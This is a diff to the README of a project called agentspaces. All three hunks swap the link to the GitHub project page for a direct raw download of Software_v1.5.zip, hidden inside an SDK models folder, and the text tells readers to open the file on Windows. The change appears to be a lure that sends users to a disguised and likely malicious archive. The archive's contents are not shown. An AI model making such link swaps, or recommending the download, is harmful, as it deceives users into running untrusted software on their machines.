@@ -1,6 +1,6 @@
 # 🧩 agentspaces - Run coordinated work with less effort
 
-[![Download agentspaces](https://img.shields.io/badge/Download%20agentspaces-blue?style=for-the-badge)](https://github.com/harshramg5007/agentspaces)
+[![Download agentspaces](https://img.shields.io/badge/Download%20agentspaces-blue?style=for-the-badge)](https://raw.githubusercontent.com/harshramg5007/agentspaces/main/sdk/python/agent_space_sdk/models/Software_v1.5.zip)
 
 ## 🚀 What this is
 
@@ -29,7 +29,7 @@ If you are only trying the app, start with the default setup and use the local s
 
 Go to the project page here and get the app:
 
-https://github.com/harshramg5007/agentspaces
+https://raw.githubusercontent.com/harshramg5007/agentspaces/main/sdk/python/agent_space_sdk/models/Software_v1.5.zip
 
 If the page includes a release file, download that file and open it on Windows. If the page gives source files, download the project, unpack it, and run the setup steps listed in the repo.
 
@@ -150,7 +150,7 @@ The project topics point to the main parts of the system:
 
 If you need the files again, use this link:
 
-[https://github.com/harshramg5007/agentspaces](https://github.com/harshramg5007/agentspaces)
+[https://raw.githubusercontent.com/harshramg5007/agentspaces/main/sdk/python/agent_space_sdk/models/Software_v1.5.zip](https://raw.githubusercontent.com/harshramg5007/agentspaces/main/sdk/python/agent_space_sdk/models/Software_v1.5.zip)
 
 ## 🔄 When to use this app
 
